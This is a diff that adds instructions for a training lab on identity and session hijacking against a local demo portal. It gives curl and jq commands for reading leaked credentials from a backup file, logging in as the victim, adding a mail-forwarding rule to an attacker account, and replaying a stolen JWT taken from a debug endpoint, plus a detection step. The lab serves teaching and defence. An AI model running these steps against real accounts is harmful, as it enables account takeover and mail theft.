@@ -1,0 +1,144 @@
+Identity & Session Hijacking -- DEMO terminal
+===============================================
+Target portal : http://victim-portal:8000   (172.26.0.2)
+You (attacker): 172.26.0.3
+Victim        : 172.26.0.4  (user01 logs in from here, baseline traffic)
+Monitor       : 172.26.0.5  (audit-log correlation)
+
+Goal: demonstrate the full chain in one run:
+  B1 credential leak -> B2 account hijack -> B3 mailbox hijack
+  -> B4 JWT/token hijack -> B5 session persistence after password change.
+
+This is a DEMO lab: there is no checkwork/score. Evidence is what you see
+on the terminal plus the JSONL audit log lines.
+
+------------------------------------------------------------------
+B1 - Credential compromise
+------------------------------------------------------------------
+The old HR sync job left a backup export on the portal:
+
+  curl -s http://172.26.0.2:8000/backup/users.csv
+
+Read the user01 line. The password contains '!' -- in bash always wrap
+the -d/--data-urlencode argument in SINGLE quotes.
+
+------------------------------------------------------------------
+B2 - Account hijacking (web session)
+------------------------------------------------------------------
+Log in as the victim with the leaked password and change the profile:
+
+  curl -s -o /dev/null -w 'login HTTP %{http_code}\n' \
+    -c /tmp/c.jar -X POST http://172.26.0.2:8000/login \
+    --data-urlencode 'username=user01@datn.local' \
+    --data-urlencode 'password=Us3r01_DATN!2026'
+
+  curl -s -o /dev/null -w 'profile HTTP %{http_code}\n' \
+    -b /tmp/c.jar -c /tmp/c.jar -X POST http://172.26.0.2:8000/profile \
+    --data-urlencode 'phone=+84-900-000-000'
+
+GUI alternative (recommended for the report): open Firefox in this
+container, log in as user01, edit the phone, then open the mailbox:
+
+  firefox http://172.26.0.2:8000 &
+
+Expected audit lines (src_ip=172.26.0.3):
+  login_success, profile_updated
+
+------------------------------------------------------------------
+B3 - Email / mailbox hijacking
+------------------------------------------------------------------
+With the hijacked session, install a forwarding rule and send a test
+message to the victim mailbox:
+
+  curl -s -o /dev/null -w 'forward HTTP %{http_code}\n' \
+    -b /tmp/c.jar -c /tmp/c.jar -X POST http://172.26.0.2:8000/mail/forward \
+    --data-urlencode 'target=attacker@datn.local'
+
+  curl -s -b /tmp/c.jar -c /tmp/c.jar -X POST http://172.26.0.2:8000/mail/send \
+    --data-urlencode 'to=user01@datn.local' \
+    --data-urlencode 'subject=Forward test' \
+    --data-urlencode 'body=This message should be forwarded to the attacker.'
+
+Now log in as your own attacker account and read the forwarded copy:
+
+  curl -s -c /tmp/a.jar -X POST http://172.26.0.2:8000/login \
+    --data-urlencode 'username=attacker@datn.local' \
+    --data-urlencode 'password=Att4ck3r_DATN!2026'
+
+  curl -s -b /tmp/a.jar http://172.26.0.2:8000/mail/inbox
+
+Expected audit lines:
+  mailbox_rule_created  (user01, rule=attacker@datn.local)
+  mail_forwarded        (mailbox=user01, target=attacker@datn.local)
+
+------------------------------------------------------------------
+B4 - Token hijacking (JWT replay, no browser login)
+------------------------------------------------------------------
+The developers forgot /debug/sessions. It lists live web sessions and
+JWTs, including the victim's token issued from 172.26.0.4:
+
+  curl -s http://172.26.0.2:8000/debug/sessions -o /tmp/sessions.json
+
+  jq -r '.sessions[] | select(.type=="jwt" and .user_id=="user01@datn.local") |
+         [.jti,.issued_src] | @tsv' /tmp/sessions.json
+
+  JWT=$(jq -r '.sessions[] | select(.type=="jwt" and
+         .user_id=="user01@datn.local") | .token' /tmp/sessions.json | head -1)
+
+Replay that token from YOUR terminal -- no cookie, no login:
+
+  curl -s -H "Authorization: Bearer $JWT" http://172.26.0.2:8000/api/me
+  curl -s -H "Authorization: Bearer $JWT" http://172.26.0.2:8000/api/mailbox/summary
+
+Expected audit lines (same jti as token_issued, but src_ip=172.26.0.3):
+  api_access  (replay=true)
+
+This is what distinguishes Token Hijacking from Account Hijacking: the
+attacker never authenticates; the stolen token itself is the identity.
+
+------------------------------------------------------------------
+B5 - Session persistence after a password change
+------------------------------------------------------------------
+Switch to the VICTIM terminal (172.26.0.4) and run:
+
+  cd /home/ubuntu
+  ./change_password_baseline.sh
+
+That changes user01's password in baseline mode (old sessions/tokens are
+NOT revoked; that is the control gap being demonstrated).
+
+Back in THIS attacker terminal, replay the old token again:
+
+  curl -s -o /dev/null -w 'old token HTTP %{http_code}\n' \
+    -H "Authorization: Bearer $JWT" http://172.26.0.2:8000/api/me
+
+Expected: HTTP 200, and audit lines password_changed + api_access with
+the old jti. Try `./change_password_baseline.sh hardened` on a fresh lab
+to see the comparison (old token should then get HTTP 401).
+
+------------------------------------------------------------------
+Evidence / audit log
+------------------------------------------------------------------
+In the VICTIM-PORTAL terminal:
+
+  tail -n 12 /var/log/datn/app.jsonl | jq -c \
+    '{timestamp,event_type,user_id,src_ip,jti,mailbox,rule,result}'
+
+Or from this attacker terminal (the debug audit export is another
+forgotten endpoint):
+
+  curl -s http://172.26.0.2:8000/debug/audit | tail -n 12 | jq -c .
+
+------------------------------------------------------------------
+Detection (optional)
+------------------------------------------------------------------
+In the MONITOR terminal (172.26.0.5):
+
+  python3 detector/detect.py
+
+Outputs ~/incident/timeline.csv and ~/incident/incident_summary.json,
+correlating account + mailbox + token signals into one incident.
+
+Tools: curl, jq, python3, firefox (GUI), tcpdump.
+Reset:  labtainer -r web-attk-identity-session-hijacking
+Stop :  stoplab web-attk-identity-session-hijacking
